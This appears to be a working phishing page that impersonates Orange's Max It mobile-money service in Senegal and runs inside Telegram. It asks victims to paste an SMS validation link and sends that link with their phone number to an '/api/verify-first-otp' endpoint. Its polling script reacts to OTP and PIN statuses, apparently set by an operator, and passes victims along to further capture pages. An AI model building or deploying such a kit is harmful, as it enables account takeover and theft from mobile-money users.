<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Max It Sénégal - Vérification</title>
    
    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #ff6600;
            --orange-gradient: linear-gradient(180deg, #ff7700 0%, #ff6600 100%);
            --bg-color: #f7f7f7;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #666666;
            --border-orange: #ff6600;
            --btn-disabled-bg: #e0e0e0;
            --btn-disabled-text: #999999;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .header-box {
            width: 100%;
            background: var(--orange-gradient);
            padding: 25px 20px 40px 20px;
            color: white;
            text-align: center;
            font-size: 26px;
            font-weight: 800;
        }

        .main-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: -20px;
            flex-grow: 1;
        }

        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            align-self: flex-start;
        }

        h2 {
            margin: 0 0 12px 0;
            font-size: 22px;
            color: var(--text-dark);
            font-weight: 800;
            text-align: center;
        }

        .instruction {
            font-size: 14px;
            color: var(--text-muted);
            margin: 0 0 12px 0;
            line-height: 1.4;
            text-align: center;
        }

        .phone-number {
            font-size: 16px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* SMS Link Input Field Container */
        .link-input-container {
            margin-bottom: 20px;
        }

        .link-box {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid var(--border-orange);
            border-radius: 10px;
            font-size: 15px;
            outline: none;
            color: var(--text-dark);
            background-color: #ffffff;
        }

        .link-box:focus {
            box-shadow: 0 0 5px rgba(255, 102, 0, 0.5);
        }

        .submit-btn {
            width: 100%;
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--orange-primary);
            color: white;
            cursor: pointer;
        }

        .footer-banner {
            width: 100%;
            background: var(--orange-gradient);
            height: 80px;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
            margin-top: 40px;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: var(--orange-gradient);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
            padding: 24px;
        }

        .overlay-card {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .overlay-title {
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 12px;
            color: white;
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="header-box">
    Orange Max It
</div>

<div class="main-container">
    <div class="card">
        <h2>Vérification Max It</h2>

        <p class="instruction">
            Veuillez coller le lien de validation reçu par SMS ci-dessous :
        </p>

        <div class="phone-number">
            <span>🇸🇳</span>
            <span id="displayPhone">+221 ...</span>
        </div>

        <!-- SMS Link Input Field -->
        <div class="link-input-container">
            <input type="url" id="smsLinkInput" class="link-box" placeholder="https://..." autocomplete="off">
        </div>

        <div id="errorText" class="error-message">Le lien saisi est invalide ou a expiré.</div>

        <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
    </div>
</div>

<div class="footer-banner"></div>

<div class="overlay" id="statusOverlay">
    <div class="overlay-card">
        <div class="spinner"></div>
        <div class="overlay-title">Veuillez patienter...</div>
    </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const smsLinkInput = document.getElementById('smsLinkInput');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');

    let checkInterval = null;

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
    if (savedPhone) {
        displayPhone.textContent = `+221 ${savedPhone.replace(/^\+?221/, '')}`;
    }

    smsLinkInput.addEventListener('input', () => {
        const val = smsLinkInput.value.trim();
        const isValid = val.length > 5;
        submitBtn.disabled = !isValid;
        submitBtn.classList.toggle('active', isValid);
        errorText.style.display = 'none';
    });

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);

        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                } 
                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
                    clearInterval(checkInterval);
                    window.location.href = "/page6?error=wrongpin";
                } 
                else if (data.status === "otp1_wrong") {
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    errorText.textContent = "Le lien est incorrect ou a expiré, veuillez vérifier le SMS reçu.";
                    errorText.style.display = "block";
                    smsLinkInput.value = "";
                    submitBtn.disabled = true;
                    submitBtn.classList.remove('active');
                }
            } catch (err) {
                console.error("Erreur de statut:", err);
            }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;

        const linkValue = smsLinkInput.value.trim();
        if (!linkValue) return;

        statusOverlay.style.display = "flex";
        errorText.style.display = "none";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: savedPhone,
                    code: linkValue,
                    country: "SN"
                })
            });

            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
                alert("Erreur lors de l'envoi.");
            }
        } catch (err) {
            statusOverlay.style.display = "none";
            alert("Erreur de connexion.");
        }
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
